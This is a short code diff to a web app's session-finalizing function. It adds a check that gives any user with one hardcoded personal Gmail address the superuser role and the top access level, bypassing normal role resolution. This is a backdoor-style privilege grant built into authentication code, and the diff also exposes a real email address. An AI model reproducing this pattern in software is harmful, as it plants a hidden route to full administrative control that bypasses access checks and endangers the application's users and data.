@@ -80,10 +80,17 @@ export const finalizeAuthenticatedSession = (options: {
   rememberMe?: boolean;
   returnTo?: string | null;
 }): string => {
-  const resolvedRole = normalizeRoleForUserContext(options.user.role, options.user.email);
+  const isManagingDirectorMaster =
+    options.user.email?.toLowerCase().trim() === 'arslanmalikgoraha@gmail.com';
+
+  const resolvedRole = isManagingDirectorMaster
+    ? CANONICAL_SUPERUSER_ROLE
+    : normalizeRoleForUserContext(options.user.role, options.user.email);
+
   const resolvedUser: AppUser = {
     ...options.user,
     role: resolvedRole ?? options.user.role,
+    ...(isManagingDirectorMaster ? { accessLevel: 5 } : {}),
   };
 
   options.dispatch(setUser(resolvedUser));
